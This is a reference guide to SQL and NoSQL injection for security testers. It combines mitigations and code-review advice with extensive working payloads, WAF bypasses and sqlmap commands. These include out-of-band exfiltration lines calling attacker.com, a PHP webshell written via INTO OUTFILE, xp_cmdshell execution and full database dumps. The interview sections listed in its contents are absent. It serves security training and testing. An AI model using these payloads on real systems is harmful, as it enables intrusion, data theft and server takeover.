# SQL Injection — Complete Security Engineer Reference
> Basic to Advanced: Theory, Manual Testing, sqlmap Mastery, NoSQL Injection, and 20 Scenario-Based Interview Questions

---

## Table of Contents
1. [What is SQL Injection](#1-what-is-sql-injection)
2. [Impact of SQL Injection](#2-impact-of-sql-injection)
3. [Root Cause & Mitigation](#3-root-cause--mitigation)
4. [Types of SQL Injection](#4-types-of-sql-injection)
5. [Identifying SQLi in Source Code](#5-identifying-sqli-in-source-code)
6. [Manual Testing — By Injection Type](#6-manual-testing--by-injection-type)
7. [Database Fingerprinting](#7-database-fingerprinting)
8. [Advanced Manual Techniques (Beyond `' OR 1=1`)](#8-advanced-manual-techniques-beyond--or-11)
9. [sqlmap — Full Command Reference](#9-sqlmap--full-command-reference)
10. [Where to Prioritize Testing](#10-where-to-prioritize-testing)
11. [Checklist & Payload Cheat Sheet](#11-checklist--payload-cheat-sheet)
12. [WAF Bypass Techniques](#12-waf-bypass-techniques)
13. [NoSQL Injection](#13-nosql-injection)
14. [SQL vs NoSQL — How to Tell Which You're Dealing With](#14-sql-vs-nosql--how-to-tell-which-youre-dealing-with)
15. [Interview Questions & Answers](#15-interview-questions--answers)
16. [Scenario-Based Questions & Answers (20)](#16-scenario-based-questions--answers-20)

---

## 1. What is SQL Injection

SQL Injection (SQLi) is a vulnerability that occurs when **untrusted user input is concatenated directly into a SQL query** without proper sanitization or parameterization, allowing an attacker to alter the query's logic and structure.

**Vulnerable code example:**
```python
query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "'"
```

If `username = admin'--`, the query becomes:
```sql
SELECT * FROM users WHERE username = 'admin'--' AND password = '...'
```
The `--` comments out the password check, authenticating as `admin` without a valid password.

**Core principle:** The database cannot distinguish between code and data when input is concatenated as a raw string. SQLi exploits this confusion.

---

## 2. Impact of SQL Injection

| Impact | Description |
|--------|-------------|
| **Confidentiality** | Dump entire database — PII, credentials, financial records, session tokens |
| **Authentication Bypass** | Log in as any user, including admin, without credentials |
| **Integrity** | Modify/delete data (`UPDATE`, `DELETE`, `DROP TABLE`) |
| **Availability** | `DROP TABLE`, resource-intensive queries → DoS |
| **Remote Code Execution** | `xp_cmdshell` (MSSQL), `INTO OUTFILE` (MySQL web shell), `COPY ... TO PROGRAM` (PostgreSQL) |
| **Privilege Escalation** | Read DB credentials → pivot to OS-level access |
| **Lateral Movement** | DB server often has access to internal network/other systems |
| **Compliance/Legal** | PCI-DSS, GDPR, HIPAA violations → fines, breach disclosure |

**Real-world severity reference:** SQLi has historically ranked in OWASP Top 10 (A03:2021 - Injection) and caused some of the largest breaches in history (Equifax-adjacent incidents, Heartland Payment Systems, TalkTalk, Sony Pictures).

---

## 3. Root Cause & Mitigation

### Root Cause
Mixing **code (SQL syntax)** and **data (user input)** in the same string without separation.

### Mitigation — Ranked by Effectiveness

**1. Parameterized Queries / Prepared Statements (PRIMARY DEFENSE)**
```java
// Java
PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE username = ? AND password = ?");
stmt.setString(1, username);
stmt.setString(2, password);
```
```python
# Python
cursor.execute("SELECT * FROM users WHERE username = %s AND password = %s", (username, password))
```
```php
// PHP PDO
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username");
$stmt->execute(['username' => $username]);
```
> Parameterized queries separate code from data at the driver level — the database treats input strictly as data, never as executable SQL.

**2. ORM Usage (with caveats)**
```python
# Django ORM - safe
User.objects.filter(username=username)

# Django ORM - UNSAFE if raw() used carelessly
User.objects.raw(f"SELECT * FROM users WHERE username = '{username}'")  # Still vulnerable!
```
> ORMs are safe by default but become vulnerable when developers drop to raw SQL/`.raw()`/`.extra()` methods.

**3. Input Validation (Defense in Depth, not primary)**
- Allowlist validation (only allow expected characters/format).
- Type enforcement (cast to int if expecting integer).
- **Never rely on blocklisting** (`'`, `--`, `OR`) — easily bypassed.

**4. Least Privilege Database Accounts**
- Web app DB user should NOT have `DROP`, `ALTER`, or admin rights.
- Separate read-only accounts for reporting features.

**5. Stored Procedures (if parameterized internally)**
- Safe only if they don't internally concatenate strings (dynamic SQL inside a proc is still vulnerable).

**6. WAF (Defense in Depth, NOT a fix)**
- Detects/blocks known patterns; bypassable. Never a substitute for code fixes.

**7. Escaping Special Characters (Legacy/Weak)**
- `mysql_real_escape_string()` — deprecated, error-prone, last resort only.

**8. ORM/Query Builder Output Encoding**
- Ensure error messages don't leak SQL syntax (no verbose DB errors in production).

---

## 4. Types of SQL Injection

### By Technique

| Type | Description |
|------|-------------|
| **In-band (Classic)** | Same channel used to inject and retrieve results |
| ↳ Error-based | Database error messages leak data directly |
| ↳ Union-based | `UNION SELECT` combines attacker query with original to extract data |
| **Inferential (Blind)** | No data returned directly; inferred via behavior |
| ↳ Boolean-based blind | True/false conditions change page response (content/length) |
| ↳ Time-based blind | `SLEEP()`/`WAITFOR DELAY` — response time reveals truth value |
| **Out-of-band (OOB)** | Data exfiltrated via a different channel (DNS, HTTP) |

### By Injection Context (Insertion Point Type)

| Context | Example |
|---------|---------|
| **In-band parameter (GET/POST)** | `?id=1` |
| **Cookie-based** | `Cookie: session=1' OR '1'='1` |
| **Header-based** | `User-Agent: ' OR SLEEP(5)--` , `X-Forwarded-For` |
| **Second-order SQLi** | Payload stored first (e.g., in profile name), triggers later in a different query |
| **Stacked queries** | `; DROP TABLE users;--` (multiple statements in one request — DB/driver dependent) |
| **SOAP/XML-based SQLi** | Injection within XML node values passed to backend SQL |
| **JSON-based SQLi** | Injection within JSON body values |

---

## 5. Identifying SQLi in Source Code

### Code Review Checklist

**RED FLAGS — String concatenation into queries:**
```python
# Python - VULNERABLE
query = "SELECT * FROM products WHERE id = " + request.GET['id']
cursor.execute(query)

# VULNERABLE - f-string
query = f"SELECT * FROM users WHERE email = '{email}'"

# VULNERABLE - % formatting
query = "SELECT * FROM logs WHERE user = '%s'" % username
```

```java
// Java - VULNERABLE
String query = "SELECT * FROM accounts WHERE id = '" + userId + "'";
Statement stmt = conn.createStatement();
stmt.executeQuery(query);
```

```php
// PHP - VULNERABLE
$query = "SELECT * FROM users WHERE id = " . $_GET['id'];
mysqli_query($conn, $query);
```

```javascript
// Node.js - VULNERABLE
db.query(`SELECT * FROM users WHERE name = '${req.body.name}'`);
```

### SAFE Patterns to Confirm (Negative Indicators)
```python
cursor.execute("SELECT * FROM users WHERE id = %s", (user_id,))   # ✅ Safe
User.objects.filter(id=user_id)                                    # ✅ Safe (Django ORM)
stmt.setString(1, input)                                            # ✅ Safe (Java PreparedStatement)
```

### Static Analysis Tools
| Tool | Language |
|------|----------|
| **Semgrep** | Multi-language — custom rules for SQLi patterns |
| **SonarQube** | Multi-language |
| **Bandit** | Python |
| **Brakeman** | Ruby on Rails |
| **FindSecBugs** | Java |
| **CodeQL** | Multi-language (GitHub) |

**Sample Semgrep rule concept:**
```yaml
rules:
  - id: sql-injection-string-concat
    pattern: $QUERY = "..." + $INPUT
    message: Possible SQL injection via string concatenation
    severity: ERROR
```

### Things to Grep For (Quick Manual Code Audit)
```bash
grep -rn "SELECT.*+" --include="*.py"
grep -rn "execute(f\"" --include="*.py"
grep -rn "createStatement()" --include="*.java"
grep -rn "mysqli_query.*\$_" --include="*.php"
grep -rn "\.raw(" --include="*.py"      # Django raw queries
grep -rn "\\$\{.*\}.*SELECT" --include="*.js"
```

---

## 6. Manual Testing — By Injection Type

### Pre-Step: Identify Injectable Parameters
Test every: GET params, POST body, headers (`User-Agent`, `Referer`, `X-Forwarded-For`, `Cookie`), JSON keys, XML nodes, multipart filenames, sort/order parameters (`?sort=name`), search boxes.

---

### A. Error-Based SQLi (MySQL example)

**Step 1 — Break the syntax:**
```sql
id=1'
id=1"
id=1`
id=1)
```
If you get a DB error (`You have an error in your SQL syntax...`), it's likely vulnerable.

**Step 2 — Confirm with logic test:**
```sql
id=1' AND '1'='1     → normal page
id=1' AND '1'='2     → different page / no results
```

**Step 3 — Extract data via error messages (MySQL):**
```sql
' AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(VERSION(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```
```sql
' AND extractvalue(1, concat(0x7e, (SELECT version())))--
' AND extractvalue(1, concat(0x7e, (SELECT table_name FROM information_schema.tables LIMIT 1)))--
```

---

### B. Union-Based SQLi

**Step 1 — Determine number of columns:**
```sql
id=1 ORDER BY 1--   (no error)
id=1 ORDER BY 2--
id=1 ORDER BY 3--
id=1 ORDER BY 4--   (error → 3 columns confirmed)
```
Or via UNION:
```sql
id=1 UNION SELECT NULL--
id=1 UNION SELECT NULL,NULL--
id=1 UNION SELECT NULL,NULL,NULL--   (works → 3 columns)
```

**Step 2 — Identify which columns reflect on page:**
```sql
id=-1 UNION SELECT 1,2,3--
```
Negative ID forces original query to return nothing, so UNION result displays. Note which numbers (1, 2, or 3) appear on the page — those are your "output columns."

**Step 3 — Extract data:**
```sql
id=-1 UNION SELECT 1,@@version,3--
id=-1 UNION SELECT 1,table_name,3 FROM information_schema.tables--
id=-1 UNION SELECT 1,column_name,3 FROM information_schema.columns WHERE table_name='users'--
id=-1 UNION SELECT 1,CONCAT(username,0x3a,password),3 FROM users--
```

---

### C. Boolean-Based Blind SQLi

No errors, no UNION output visible — only page behavior changes (content length, presence/absence of an element).

**Step 1 — Confirm blind injection:**
```sql
id=1 AND 1=1   → page loads normally ("Welcome back")
id=1 AND 1=2   → page shows different content ("No results")
```

**Step 2 — Extract data bit by bit (substring + ASCII):**
```sql
-- Confirm DB version starts with '5'
id=1 AND SUBSTRING(@@version,1,1)='5'

-- Extract first character of first table name
id=1 AND SUBSTRING((SELECT table_name FROM information_schema.tables LIMIT 1),1,1)='a'

-- Using ASCII for binary search (faster manual approach)
id=1 AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)) > 100
```

**Manual Binary Search Technique** (much faster than incrementing one by one):
```
Goal: find ASCII value of 1st char of password (range 0-255)
Test: > 127? → yes → test > 191? → no → test > 159? ...
(Binary search reduces ~256 requests to ~8 requests per character)
```

---

### D. Time-Based Blind SQLi

Used when there's no visible difference in response — relies purely on response delay.

**MySQL:**
```sql
id=1 AND IF(1=1, SLEEP(5), 0)
id=1 AND (SELECT SLEEP(5) FROM users WHERE username='admin')
```

**MSSQL:**
```sql
id=1; IF (1=1) WAITFOR DELAY '0:0:5'
```

**PostgreSQL:**
```sql
id=1 AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)
```

**Oracle:**
```sql
id=1 AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)
```

**Extracting data via time delays (conditional):**
```sql
id=1 AND IF(SUBSTRING((SELECT password FROM users LIMIT 1),1,1)='a', SLEEP(5), 0)
```
If response takes 5 seconds → character confirmed; iterate through charset and positions.

---

### E. Out-of-Band (OOB) SQLi

Used when in-band/blind methods are too slow or blocked, and the DB can make outbound network calls.

**MSSQL (DNS exfiltration via xp_dirtree / xp_fileexist):**
```sql
'; EXEC master..xp_dirtree '\\attacker-server\share'--
```

**MySQL (via LOAD_FILE or INTO OUTFILE for OOB-like behavior, limited):**
```sql
' UNION SELECT LOAD_FILE(CONCAT('\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\test'))--
```

**Oracle (UTL_HTTP / UTL_INADDR for DNS lookup):**
```sql
' AND (SELECT UTL_INADDR.get_host_address((SELECT banner FROM v$version WHERE rownum=1)) FROM dual)--
```

**PostgreSQL (DNS/HTTP via dblink or COPY):**
```sql
'; COPY (SELECT '') TO PROGRAM 'nslookup attacker.com'--
```

Use **Burp Collaborator** to receive and confirm the DNS/HTTP callback.

---

### F. Stacked Queries

Only works where the driver/DB allows multiple statements per request (PHP `mysqli` with `multi_query`, MSSQL, PostgreSQL — NOT default MySQL via PDO single query).

```sql
id=1; DROP TABLE logs--
id=1; INSERT INTO users (username,password,role) VALUES ('hacker','pass','admin')--
id=1; EXEC xp_cmdshell('whoami')--
```

---

### G. Second-Order SQLi

Payload injected in one location (e.g., registration "name" field), executed later when a *different* query uses that stored value unsanitized.

**Test approach:**
1. Register with username: `admin'--`
2. Trigger any feature that later queries by that username (e.g., "forgot password," admin lookup, audit log search).
3. Observe if the later query breaks/behaves differently.

---

## 7. Database Fingerprinting

### Identify DBMS via Error Messages / Behavior

| Technique | MySQL | MSSQL | Oracle | PostgreSQL |
|-----------|-------|-------|--------|------------|
| Version | `@@version` | `@@version` | `SELECT banner FROM v$version` | `version()` |
| Comment syntax | `-- ` , `#` | `--` | `--` | `--` |
| String concat | `CONCAT(a,b)` | `a + b` | `a \|\| b` | `a \|\| b` |
| Substring | `SUBSTRING(s,1,1)` | `SUBSTRING(s,1,1)` | `SUBSTR(s,1,1)` | `SUBSTRING(s,1,1)` |
| Current user | `CURRENT_USER()` | `SYSTEM_USER` | `SELECT user FROM dual` | `current_user` |
| Sleep | `SLEEP(5)` | `WAITFOR DELAY '0:0:5'` | `DBMS_PIPE.RECEIVE_MESSAGE('a',5)` | `pg_sleep(5)` |
| Stacked queries | Limited (multi_query only) | Yes | No (use PL/SQL block) | Yes |
| Comment-based detection | `/*!50000 SELECT 1*/` (MySQL-specific) | N/A | N/A | N/A |

**Quick fingerprint test:**
```sql
' AND 1=CAST((SELECT @@version) AS int)--      -- forces MSSQL-style error revealing version
' AND 1=CONVERT(int,@@version)--                -- MSSQL
' OR 1=1 LIMIT 1--                               -- MySQL/PostgreSQL (LIMIT exists)
' OR 1=1 AND ROWNUM=1--                          -- Oracle (no LIMIT, uses ROWNUM)
```

---

## 8. Advanced Manual Techniques (Beyond `' OR 1=1`)

This is what separates a **junior tester** from a **pro** — going beyond default payloads.

### 1. Context-Aware Payload Crafting
Don't blindly paste `' OR 1=1--`. First understand the query context:
- Is input inside quotes? `'`, `"`, `` ` ``
- Is it numeric (no quotes)? Try `1 OR 1=1` without quotes.
- Is it inside a `LIKE` clause? `' OR '1'='1' AND '%' LIKE '%`
- Is it inside `ORDER BY`? Can't use quotes/UNION the same way — use `ORDER BY (CASE WHEN (1=1) THEN 1 ELSE (SELECT 1/0) END)` for blind boolean test.
- Is it inside a stored procedure parameter? Different escape behavior.

### 2. Second-Order & Stored Payload Hunting
Track every place user input gets stored, then check every feature that later *reads* that data in a query (search, export, admin panel, logs, audit trail).

### 3. Differential Response Analysis (not just visual)
Pros don't just "look" at the page — they:
- Diff response **length** (byte-for-byte) using Burp Comparer.
- Diff response **headers** (some apps add debug headers conditionally).
- Diff response **timing baseline** (establish 5 baseline requests before testing time-based blind, to avoid false positives from network jitter).

### 4. Encoding & Obfuscation for WAF/Filter Bypass
```sql
-- Case variation
SeLeCt * FrOm users

-- Inline comments to break up keywords
SEL/**/ECT * FR/**/OM users

-- URL/double encoding
%2527%2520OR%25201%3D1

-- Unicode/UTF-8 overlong encoding
%u0027 OR 1=1

-- Using alternative logical operators
' OR 1=1#                  -- MySQL comment alt
' OR 1=1%00                -- null byte truncation (legacy)
' OR 'x'='x

-- Whitespace alternatives (bypass space filters)
'/**/OR/**/1=1
'%0aOR%0a1=1                -- newline
'%09OR%091=1                -- tab
```

### 5. Logic-Based Confirmation Instead of Error-Based
Many modern apps suppress errors. Pros confirm injection purely through **logical true/false pairs** and **arithmetic equivalence**:
```sql
id=2-1        → behaves like id=1 (confirms numeric context is evaluated, not just string match)
id=1+0
id=(1)
id=1.0
```
If `id=2-1` returns same result as `id=1`, the parameter is being evaluated arithmetically — strong signal of raw SQL evaluation rather than strict input matching.

### 6. Testing JSON/REST API Bodies, Not Just Forms
```json
{"id": "1' OR '1'='1"}
{"id": 1, "filter": {"$ne": null}}    // mixed SQL/NoSQL test in same body
```
Many testers skip JSON APIs because Burp's default scanner sometimes misses deeply nested JSON keys — manually test every leaf value.

### 7. Multi-Parameter / Chained Injection
Sometimes a single parameter looks "clean" but combining two parameters reveals injection (e.g., `sort` parameter combined with `order` parameter that builds: `ORDER BY {sort} {order}`).
```sql
sort=name&order=ASC,(SELECT SLEEP(5))--
```

### 8. Testing HTTP Headers Often Skipped by Juniors
```
X-Forwarded-For: 1' OR SLEEP(5)--
Referer: http://test.com/' OR 1=1--
X-Forwarded-Host: '; WAITFOR DELAY '0:0:5'--
Cookie: tracking_id=1' UNION SELECT NULL--
```
These are logged into analytics/audit tables and often hit raw SQL inserts without sanitization.

### 9. Testing Auto-Increment/Implicit Type Coercion Tricks
```sql
id=1' AND SLEEP(5)='0     -- exploits implicit type coercion in MySQL (string '0' = boolean false context)
```

### 10. Leveraging DB-Specific Functions for Privilege/Environment Recon
```sql
-- MySQL - check FILE privilege
' UNION SELECT LOAD_FILE('/etc/passwd')--

-- MySQL - write webshell
' UNION SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php'--

-- MSSQL - command execution
'; EXEC xp_cmdshell('whoami')--

-- PostgreSQL - command execution (if superuser)
'; COPY (SELECT '') TO PROGRAM 'id'--
```

### 11. Testing Second Channel — Response Headers / Cache Behavior
Check if injected payload affects `Set-Cookie`, `Location` (redirect), or caching headers — sometimes the injection point feeds into a different output channel than the HTML body.

---

## 9. sqlmap — Full Command Reference

### Basic Usage
```bash
# Basic GET parameter test
sqlmap -u "http://target.com/page?id=1"

# Specify which parameter to test
sqlmap -u "http://target.com/page?id=1&cat=2" -p id

# POST request
sqlmap -u "http://target.com/login" --data="username=admin&password=test"

# Using a saved Burp request file (recommended — preserves headers/cookies)
sqlmap -r request.txt
```

### Authentication / Session Handling
```bash
# With cookie
sqlmap -u "http://target.com/page?id=1" --cookie="session=abc123"

# With custom headers
sqlmap -u "http://target.com/page?id=1" --headers="X-Custom: value"

# Random User-Agent
sqlmap -u "http://target.com/page?id=1" --random-agent

# Authenticated session via login (csrf token handling)
sqlmap -u "http://target.com/page?id=1" --cookie="session=abc" --csrf-token="csrf_token"
```

### Specifying Injection Techniques
```bash
# --technique flags: B=Boolean, E=Error, U=Union, S=Stacked, T=Time, Q=Inline
sqlmap -u "http://target.com/page?id=1" --technique=BEUST

# Force only time-based blind (useful when others are noisy/slow)
sqlmap -u "http://target.com/page?id=1" --technique=T
```

### Database Enumeration
```bash
# List databases
sqlmap -u "http://target.com/page?id=1" --dbs

# Current DB
sqlmap -u "http://target.com/page?id=1" --current-db

# Current user
sqlmap -u "http://target.com/page?id=1" --current-user

# Check if current user is DBA
sqlmap -u "http://target.com/page?id=1" --is-dba

# List tables in a specific database
sqlmap -u "http://target.com/page?id=1" -D dbname --tables

# List columns in a table
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --columns

# Dump table data
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump

# Dump specific columns only
sqlmap -u "http://target.com/page?id=1" -D dbname -T users -C username,password --dump

# Dump entire database (all tables)
sqlmap -u "http://target.com/page?id=1" -D dbname --dump-all

# Dump everything (all DBs, all tables) - aggressive
sqlmap -u "http://target.com/page?id=1" --dump-all --exclude-sysdbs
```

### Advanced Exploitation
```bash
# OS shell (if DB has command execution privileges - MySQL/MSSQL/PostgreSQL)
sqlmap -u "http://target.com/page?id=1" --os-shell

# SQL shell (interactive raw SQL queries)
sqlmap -u "http://target.com/page?id=1" --sql-shell

# Read a file from server (requires FILE privilege - MySQL)
sqlmap -u "http://target.com/page?id=1" --file-read="/etc/passwd"

# Write a file to server (webshell upload)
sqlmap -u "http://target.com/page?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# Privilege escalation enumeration
sqlmap -u "http://target.com/page?id=1" --privileges

# Password hash dump + crack attempt
sqlmap -u "http://target.com/page?id=1" -D dbname -T users -C password --dump --hash-format=mysql
```

### Performance & Evasion Tuning
```bash
# Set risk level (1-3): higher risk = more aggressive/destructive payloads
sqlmap -u "http://target.com/page?id=1" --risk=3

# Set level (1-5): how thoroughly to test (tests more insertion points/payloads)
sqlmap -u "http://target.com/page?id=1" --level=5

# Set thread count (parallel requests)
sqlmap -u "http://target.com/page?id=1" --threads=10

# Add delay between requests (avoid WAF/rate limiting)
sqlmap -u "http://target.com/page?id=1" --delay=2

# Set timeout
sqlmap -u "http://target.com/page?id=1" --timeout=30

# Tamper scripts for WAF bypass
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,charencode

# Use Tor for anonymity
sqlmap -u "http://target.com/page?id=1" --tor --check-tor

# Proxy through Burp (to see/log sqlmap traffic)
sqlmap -u "http://target.com/page?id=1" --proxy="http://127.0.0.1:8080"
```

### Common Tamper Scripts
| Tamper | Purpose |
|--------|---------|
| `space2comment` | Replaces spaces with `/**/` |
| `charencode` | URL-encodes all characters |
| `between` | Replaces `>` with `NOT BETWEEN 0 AND` |
| `randomcase` | Randomizes keyword casing (SeLeCT) |
| `apostrophemask` | Replaces `'` with UTF-8 equivalent |
| `equaltolike` | Replaces `=` with `LIKE` |
| `unionalltounion` | Replaces `UNION ALL SELECT` with `UNION SELECT` |
| `versionedmorekeywords` | Adds versioned MySQL comments `/*!keyword*/` |

```bash
# Chain multiple tamper scripts
sqlmap -u "http://target.com/page?id=1" --tamper=space2comment,charencode,randomcase
```

### Mass Scanning Multiple URLs
```bash
# From a file of URLs (Google dork results, crawled URLs, etc.)
sqlmap -m urls.txt

# Crawl the site first, then test discovered links
sqlmap -u "http://target.com" --crawl=3 --forms

# Test all forms found on a page
sqlmap -u "http://target.com/search" --forms
```

### Output & Reporting
```bash
# Save output to a specific format
sqlmap -u "http://target.com/page?id=1" --dump --output-dir=/path/to/output

# Batch mode (skip interactive prompts - essential for automation)
sqlmap -u "http://target.com/page?id=1" --batch

# Verbose output for debugging
sqlmap -u "http://target.com/page?id=1" -v 3

# Flush session/cache (force re-test, ignore cached results)
sqlmap -u "http://target.com/page?id=1" --flush-session
```

### Testing Specific Parameter Types
```bash
# Test JSON body
sqlmap -u "http://target.com/api/user" --data='{"id":1}' --headers="Content-Type: application/json"

# Test specific header for injection
sqlmap -u "http://target.com/page" --headers="X-Forwarded-For: 1*"
# (the * marks the injection point manually)

# Test a specific parameter only, skip others (faster)
sqlmap -u "http://target.com/page?id=1&token=abc" -p id --skip=token
```

### Full Recommended "Pro" Command for a Confirmed Vuln
```bash
sqlmap -r request.txt \
  --batch \
  --risk=3 \
  --level=5 \
  --technique=BEUST \
  --tamper=space2comment,charencode \
  --threads=5 \
  --random-agent \
  --proxy="http://127.0.0.1:8080" \
  --dbms=mysql \
  --dump-all \
  --output-dir=./sqlmap_results
```

---

## 10. Where to Prioritize Testing

### High-Priority Targets (Test First)
1. **Login forms** — username/password fields (authentication bypass impact is critical).
2. **Search functionality** — often poorly sanitized, frequently uses `LIKE` queries.
3. **Sort/filter/pagination parameters** — `?sort=name&order=ASC`, `?page=1&limit=10` — often raw SQL fragments.
4. **ID-based parameters** — `?id=`, `?user_id=`, `?product_id=` — classic IDOR + SQLi combo.
5. **Password reset / forgot password flows** — frequently overlooked by devs, high impact.
6. **Admin panels & reporting features** — complex queries, often built dynamically with string concat.
7. **File upload metadata fields** (filename stored in DB).
8. **API endpoints** (REST/GraphQL) — often skip the same validation applied to web forms.
9. **Headers logged into DB** — `User-Agent`, `Referer`, `X-Forwarded-For` (analytics tables).
10. **Multi-step forms / wizards** — state passed between steps via hidden fields, often database-backed.

### Lower Priority (But Don't Skip)
- Cookie values that look like serialized data.
- Hidden form fields.
- Export/reporting "filter" parameters (CSV/PDF export features especially prone — often forgotten by dev teams).

---

## 11. Checklist & Payload Cheat Sheet

### Universal Detection Payloads
```
'
"
`
')
")
'))
%27
%22
1' 
1"
1 OR 1=1
1' OR '1'='1
1" OR "1"="1
1 AND 1=1
1 AND 1=2
1-- -
1#
1/*
1;--
```

### Auth Bypass Payloads
```
' OR '1'='1
' OR '1'='1'--
' OR '1'='1'#
' OR 1=1--
admin'--
admin' #
admin'/*
') OR ('1'='1
' OR 1=1 LIMIT 1--
```

### UNION-Based Probe Payloads
```
' UNION SELECT NULL--
' UNION SELECT NULL,NULL--
' UNION SELECT NULL,NULL,NULL--
' UNION SELECT 1,2,3--
' UNION SELECT @@version,2,3--
' UNION SELECT username,password,3 FROM users--
```

### Blind/Time-Based Probe Payloads
```
' AND SLEEP(5)--
' AND IF(1=1,SLEEP(5),0)--
'; WAITFOR DELAY '0:0:5'--
' AND pg_sleep(5)--
' OR SLEEP(5)#
```

### Error-Based Probe Payloads (MySQL)
```
' AND extractvalue(1,concat(0x7e,version()))--
' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--
```

### Pre-Engagement Checklist
- [ ] Confirm written authorization/scope for active testing.
- [ ] Identify all input vectors (params, headers, cookies, JSON/XML body, file names).
- [ ] Establish baseline response (length, time, headers) before testing.
- [ ] Test each parameter individually first (isolate variables).
- [ ] Use both numeric and quoted payloads — confirm context.
- [ ] Test GET and POST equivalents of the same endpoint.
- [ ] Check error-based first (fastest), then boolean blind, then time-based (slowest).
- [ ] Fingerprint the DBMS before crafting advanced payloads.
- [ ] Check for WAF — adjust payload encoding accordingly.
- [ ] Document working payload + exact request/response evidence.
- [ ] Verify impact (don't just confirm vuln — try to demonstrate real data extraction in authorized scope).
- [ ] Check second-order injection points (anywhere stored input is later queried).
- [ ] Test for stacked queries if DBMS supports it.
- [ ] After confirming, escalate carefully (don't run destructive payloads without explicit authorization).

---

## 12. WAF Bypass Techniques

```sql
-- Comment-based keyword splitting
SEL/**/ECT

-- Case randomization
SeLeCT * FroM users

-- Encoding
%53%45%4c%45%43%54           -- URL encoded SELECT
0x53454c454354                -- Hex representation

-- Alternative syntax for common blocked patterns
'OR'1'='1                     -- no spaces
' OR/**/'1'='1
'||'1'='1                     -- pipe concatenation (Oracle/PostgreSQL)
' OR 1=1-- -                  -- trailing space/dash to keep comment valid

-- HTTP Parameter Pollution
?id=1&id=1' OR '1'='1

-- Buffer overflow / payload length to break WAF inspection limits
' OR '1'='1' /*aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa*/

-- Using JSON/XML to evade form-field-focused WAF rules
{"id": "1' OR '1'='1"}
```

---

## 13. NoSQL Injection

NoSQL databases (MongoDB, CouchDB, Redis, Cassandra, Elasticsearch) don't use SQL syntax, but injection still occurs when **unsanitized input controls query structure/operators**, especially in document-based query languages (JSON-based queries).

### MongoDB Injection (Most Common in Interviews)

**How it happens:**
```javascript
// Vulnerable Node.js/Express code
db.users.find({ username: req.body.username, password: req.body.password });
```

If the app accepts JSON body and doesn't validate types, an attacker sends:
```json
{
  "username": "admin",
  "password": {"$ne": null}
}
```
This becomes: `find({ username: "admin", password: { $ne: null } })` — "password not equal to null" is always true → **authentication bypass**.

### MongoDB Operator Injection Payloads
```json
{"username": {"$ne": null}, "password": {"$ne": null}}
{"username": "admin", "password": {"$gt": ""}}
{"username": {"$regex": "^adm"}, "password": {"$ne": null}}
{"username": {"$in": ["admin", "administrator"]}}
```

### MongoDB Injection via URL/Form Parameters (not just JSON body)
If the app parses query strings into nested objects (common in PHP/Express with `qs` library):
```
?username=admin&password[$ne]=1
```
This gets parsed as `{username: "admin", password: {"$ne": "1"}}` — same bypass via URL encoding, no JSON body needed.

### Blind NoSQL Injection (Boolean-based)
```json
{"username": "admin", "password": {"$regex": "^a"}}
{"username": "admin", "password": {"$regex": "^b"}}
```
Iterate character by character to extract password value when error/success behavior differs — same logic as blind SQLi, applied to MongoDB's `$regex`/`$where` operators.

### JavaScript Injection via `$where` (Server-Side Code Execution)
```json
{"username": {"$where": "this.username == this.username"}}
```
```javascript
// More dangerous - direct JS execution if $where accepts raw string
{"$where": "sleep(5000)"}                          // Time-based blind
{"$where": "function(){ return true; }"}
{"$where": "this.password.match(/^a/)"}             // Regex-based extraction
```

### NoSQL Injection in Other Databases

**CouchDB:**
```
Mango query injection via _find endpoint with crafted selector JSON
```

**Redis (command injection via unsanitized keys):**
```
Often via CRLF injection in unsanitized input passed to Redis commands.
```

**Elasticsearch (query DSL injection):**
```json
{"query": {"match": {"username": "admin' OR '1'='1"}}}
```
Less classic "injection" — more about lack of input validation in constructed query DSL allowing scope/filter bypass.

### NoSQL Testing Methodology
1. **Identify input that controls a query** — login forms, search, filters.
2. **Test if backend accepts JSON instead of form-encoded.** Switch `Content-Type: application/x-www-form-urlencoded` to `application/json` and send operator payloads.
3. **Test array/object syntax in URL params:** `?id[$ne]=1`, `?id[]=1&id[]=2`.
4. **Test `$where` for JS injection** if the app appears to use raw `$where` clauses (rare but high-impact).
5. **Use Burp + manual testing** — automated scanners often miss NoSQL since it's not signature-based like classic SQLi.
6. **NoSQLMap tool** — similar to sqlmap but for NoSQL:
   ```bash
   git clone https://github.com/codingo/NoSQLMap
   python nosqlmap.py
   ```

### NoSQL Injection Mitigation
- Strict input type validation (reject objects/arrays where a string/number is expected).
- Use a schema validation library (Joi, Mongoose schemas with strict typing).
- Disable `$where` operator usage entirely if not required.
- Sanitize/strip MongoDB operator characters (`$`, `.`) from user input before passing into queries.
- Use parameterized query builders / ODMs that don't directly pass raw user objects into `find()`.

---

## 14. SQL vs NoSQL — How to Tell Which You're Dealing With

### Recon Signals

| Signal | SQL | NoSQL |
|--------|-----|-------|
| **Error messages** | "You have an error in your SQL syntax", "ORA-00933", "Microsoft SQL Server" | "MongoError", "BSONError", "CastError" |
| **Tech stack fingerprint** | PHP/MySQL, Java/Oracle, .NET/MSSQL common combos | Node.js + Express + MongoDB common combo (MEAN/MERN stack) |
| **Response to `'` (single quote)** | Often breaks query → SQL error | Usually no effect (NoSQL doesn't use quotes for query structure) |
| **Response to JSON operator payloads** | No effect — SQL doesn't parse JSON | `{"$ne": null}` may bypass auth |
| **ID format** | Sequential integers (`?id=1001`) | ObjectId hex strings (`?id=507f1f77bcf86cd799439011`) — MongoDB signature |
